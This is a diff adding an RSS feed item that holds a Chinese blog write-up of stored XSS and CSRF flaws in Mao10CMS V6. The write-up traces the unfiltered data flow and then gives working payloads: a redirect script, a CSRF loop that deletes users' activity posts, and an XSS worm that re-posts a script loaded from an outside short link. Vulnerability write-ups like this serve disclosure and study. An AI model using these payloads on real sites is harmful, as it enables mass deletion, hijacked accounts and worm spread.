@@ -481,6 +481,163 @@ patching file ext/simplexml/simplexml.c
     
       
       <item>
+        <title>Mao10CMS V6 两处过滤不严可导致XSS、CSRF、XSS Wrom</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
+
+&lt;p&gt;虽然手速没有别人快，漏洞也比较简单，还是把过程贴出来慢慢努力吧&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;官网v6.1.6版本，&lt;a href=&quot;http://www.mao10.com/?m=post&amp;amp;a=single&amp;amp;id=44&quot;&gt;http://www.mao10.com/?m=post&amp;amp;a=single&amp;amp;id=44&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;测试环境docker wnameless/mysql-phpmyadmin(apache2，php5，mysql5)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;由于该cms第一个注册的用户默认是管理员账户权限较大，其他用户再未特殊的设置下均为普通账户，在测试时需加以注意。（如下说明中admin为管理员账户，larry0x为普通账户）&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-xss&quot;&gt;0x01 第一处XSS&lt;/h1&gt;
+
+&lt;p&gt;在黑盒测试当中，普通用户登陆后在进入个人主界面，在发表动态处未对输入及输出进行过滤，可导致客户端的代码攻击：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;黑盒逆向追踪源代码分析如下：&lt;/p&gt;
+
+&lt;p&gt;右键源代码之后可以发现232~244为form表单进行动态内容的提交&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在do/activity.php的1~17行有：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中将post的content直接传递进入hmset进行数据库的操作，跟进在mysql.php中的409~439行讲保存数据的数组进行了自定义的序列化之后插入数据库：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟进do/function.php的50~57行，这里只是简单得序列化压缩编码保存进入了数据库：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;至此我们的恶意输入已经保存在了服务器上。&lt;/p&gt;
+
+&lt;p&gt;由于所有的用户动态都会反应在页面坐下脚的“最新动态的面板”当中，让我们继续看看此处的输出是否有过滤。&lt;/p&gt;
+
+&lt;p&gt;在全局搜索“最新动态”的div的class名“activityShowList”，可发现该模板页面在theme/default/activity.php当中，再次全局搜索activity.php的调用，发现theme/default/footer.php会对其进行包含，而footer.php在模板页面中均会被包含。&lt;/p&gt;
+
+&lt;p&gt;下面定位到theme/default/activity.php的1~39行：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其会取出最近5次的用户动态，并在第35行中调用hget方法对动态的内容进行输出。&lt;/p&gt;
+
+&lt;p&gt;在mysql.php的366~372行当中也是对其内容反序列化后就返回结果，最终传递到模板当中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以整个参数的传递过程中从入库到出库都未进行过滤直接输出后即可导致恶意的客户端代码执行。&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-xss&quot;&gt;0x02 第二处XSS&lt;/h1&gt;
+
+&lt;p&gt;第二处的XSS存在与发布文字的话题处，此处可由用户创建任意的话题，此处也未对恶意输入进行过滤并输出，进而导致客户端代码的可执行性，在查看文章和主页显示最新文章时都可触发：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;首先在发布文章处右键源代码，定位到486~517为创建话题的form表单：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后跟进到do/pubform-topic.php文件中，在1~37当中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于没有POST id值，直接进入21行的逻辑，虽然在第26,27行对提交的内容有严格的过滤，并在29行对数据进行序列化存储到数据库当中。但注意到在第25行则是直接对POST的话题title插入到zset表当中，而未进行任何过滤：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于最后的输出点在主页的热门文章当中，我们来看看输出情况是如何的，定位到theme/default/index.php中的56~62行：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在58行中通过maoo_term_title获取文章话题的title，跟进do/function.php的918~926行：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里直接通过zscore函数从zset表中获取对应的content，最后输出到页面中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x03-&quot;&gt;0x03 危害&lt;/h1&gt;
+
+&lt;p&gt;以下均已最新动态的处的xss为例，当然在热门文章处也是可以利用触发的，原理相同&lt;/p&gt;
+
+&lt;h2 id=&quot;xss&quot;&gt;XSS&lt;/h2&gt;
+
+&lt;p&gt;最简单的打cookie喽：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不过在利用时会有一些限制，在do/function.php的426~497行当中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里使用token登陆我是没有找到其他的逻辑，所以就受限于485行的验证ip了，若达不到ip的话就只能进行IP伪造（该cms存在该缺陷）去暴力了&lt;/p&gt;
+
+&lt;p&gt;其他有趣的玩法比如插入&lt;code&gt;&amp;lt;script&amp;gt;document.location=&quot;http://www.baidu.com&quot;;&amp;lt;/script&amp;gt;&lt;/code&gt;就可以“恶意跳转”啦，其他的可以自己发挥～&lt;/p&gt;
+
+&lt;h2 id=&quot;csrf&quot;&gt;CSRF&lt;/h2&gt;
+
+&lt;p&gt;在这里附送一个CSRF，在用户主页当中，存在一个删除用户动态的链接：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着让我们定位到do/delete.php的229~238行：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在第231行虽然对权限进行了判定，只有管理员可以删除，但是并未对来源进行限制，因此可以对管理员进行CSRF攻击删除所有用户的动态信息，利用代码类似如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//skip itself}&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://localhost:8080/mao10cms-mysql/do/delete.php?type=activity&amp;amp;id=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;xss-worm&quot;&gt;XSS Worm&lt;/h2&gt;
+
+&lt;p&gt;由于在最新动态处都会显示最新的5条动态信息，并且是包含在模板页面当中的，也就说任何用户登陆后即可加载我们插入的js，进行恶意操作，这里我以关注对应用户和发布动态（维持Worm状态）为例，js代码如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/../../../do/add_guanzhu.php?id=2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/../../../do/activity.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;post_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;content=hi%3Cscript%20src%3D%27http%3A%2f%2ft.cn%2fRch1cI9%27%3E%3C%2fscript%3E&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Microsoft.XMLHTTP&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-type&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;post_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+</description>
+        
+        <pubDate>Wed, 31 Aug 2016 00:00:00 -0400</pubDate>
+        <link>
+        https://larryxi.github.io/mao10cms-v6-xss.html</link>
+        <guid isPermaLink="true">https://larryxi.github.io/mao10cms-v6-xss.html</guid>
+      </item>
+      
+    
+      
+      <item>
         <title>不插电 · WooYun Puzzle#3 Write up</title>
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
